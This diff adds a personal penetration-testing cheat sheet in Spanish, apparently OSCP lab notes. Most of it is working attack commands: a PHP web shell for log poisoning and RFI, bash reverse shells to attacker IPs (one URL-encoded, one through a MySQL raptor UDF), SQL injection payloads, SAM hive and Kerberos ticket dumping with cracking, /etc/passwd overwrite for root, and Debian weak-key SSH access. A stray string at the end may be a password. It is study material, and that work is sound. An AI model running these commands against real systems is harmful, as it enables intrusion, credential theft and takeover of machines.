@@ -1,0 +1,180 @@
+###Buscar archivos de 64bytes 
+find / -type f -size 64c -exec du -sh {} \; 2>/dev/null 
+
+
+###Buscar archivo que no son de root y modificados 1 dia atras 
+find / -mtime -1 -print ! -user root -type f*
+
+
+#########DNS############
+###Enumerar DNS Server###
+host -l 192.168.161.149#lo que se quiere buscar 192.168.161.149# (ip servidor)
+digpass axfr mailman.com @192.168.161.149
+###Buscar dominios fuerza burta por ip
+for ip in $(seq  1 255); do host 192.168.161.$ip; done | grep -v "not found"
+###Buscar dominios fuerza bruta por listado
+for ip in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt); do host $ip.mailman.com; done |grep -v "not found"
+###Envenenamiento de logs con LFI to RCE
+nc -nv 192.168.139.52 80
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+{url}/menu.php?file=/var/log/apache2/access.log&cmd=id
+- para hacer un revershell toca encodear el comando, ejemplo 
+/bin/bash -c 'bash -i > /dev/tcp/192.168.119.239/5555 0>%261' --->>>> %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%31%39%2e%32%33%39%2f%35%35%35%35%20%30%3e%25%32%36%31%27
+- se puede hacer por User Agent: tambien 
+#### hacer shell interactiva 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+stty raw -echo;fg
+reset
+terminal type? xterm-256color
+###RFI 
+se debe crear un archivo en el atacante
+└─# cat evil.txt.php                                                                                                                                                                                                     1 ⨯
+<?php echo shell_exec($_GET['cmd']);?>
+se ejecuta desde la victima
+http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipconfig
+###SQLI
+--identificar columnas 
+?id=1 GROUP BY 5--+
+--identificar campos vulnerables
+?id=1 UNION select 1,2,3,4,5
+-- extraer informacion 
+UNION select 1,2,group_concat(password),4,5 FROM users
+--automatizado 
+sqlmap -u "http://192.168.239.52/debug.php?id=1" -p"id" --dbms=sqlite --dump
+###Dump password windows Cache - NOTA: Estos archivos se deben generar con usuario System
+reg save HKLM\sam sam
+reg save HKLM\system system
+reg save HKLM\security security
+- pasar a impacket los archivos generados
+impacket-secretsdump -sam sam -security security -system system LOCAL
+[*] Dumping cached domain logon information (domain/username:hash)
+Domain/Nathan:$DCC2$10240#Nathan#298e6604af6e3f8a9fac422ab8feaf26
+-guardar lo anterior en archivo key y crackear password
+john --wordlist=rockyou.txt key
+###extraer informacion de usuarios principales SPNs
+impacket-GetUserSPNs -dc-ip 192.168.183.57 'OFFSEC.LOCAL/usuario:password' -outputfile UserSPNs
+john --format=krb5tgs --wordlist=rockyou.txt UserSPNs 
+john --format=krb5tgs --show UserSPNs
+
+
+
+
+####
+PE
+
+
+Capabilities
+/usr/sbin/getcap -r /usr/bin
+
+
+#Buscar SUID
+
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+
+# Archivos modificas hace 10 min
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+
+
+# Archivo que se puede editar 
+
+find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+
+
+#Find SUID
+find / -perm -u=s -type f 2>/dev/null
+
+#Find GUID
+find / -perm -g=s -type f 2>/dev/null
+
+
+#archivos ocultos
+find / -name ".*" -print 2>/dev/null
+
+
+#PATH Inject
+export PATH=/tmp:$PATH
+echo path
+./script.sh
+
+
+#script check
+
+linprivchecker.py
+linpeas.sh
+
+
+
+#Escape rbash
+vi -> :set shell=/bin/bash
+/bin/bash
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+#Permisos de passwd para escribir 
+openssl passwd -1 -salt ignite pass123
+echo 'ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/bin/bash' > /etc/passwd
+#
+
+
+#Identificacion de smb
+https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/smb
+
+./smbver.sh 10.11.1.115 139
+10.11.1.115: UnixSamba 227a
+#
+
+
+#ataque fuerza bruta ssh
+https://github.com/g0tmi1k/debian-ssh
+
+se procede a realizar lo que se pide en la documentacion
+git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh/common_keys
+bunzip2 debian_ssh_dsa_1024_x86.tar.bz2
+tar -xvf debian_ssh_dsa_1024_x86.tar
+cd dsa/1024
+cat authorized_key
+grep -lr 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3'
+f1fb2162a02f0f7c40c210e6167f05ca-16858.pub   === publica donde esta la authorized_key
+
+se procede a hacer ssh 
+ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss bob@10.11.1.136
+#
+
+
+#PAth Inyection
+msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
+
+se carga este archivo en bob mediante python -m ......
+se desarga en bob
+wget http://ip/scp
+chmod 755 scp
+export path=/home/bob:$PATH
+/usr/local/bin/uploadtosecure
+bob@sufferance:~$ /usr/local/bin/uploadtosecure
+#
+
+#Mysql
+mysql -u root -p
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function | 
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+
+select do_system(' bash -c 'exec bash -i &>/dev/tcp/192.168.119.184/80 <&1'');
+#
+
+
+MallardBikerNotty275
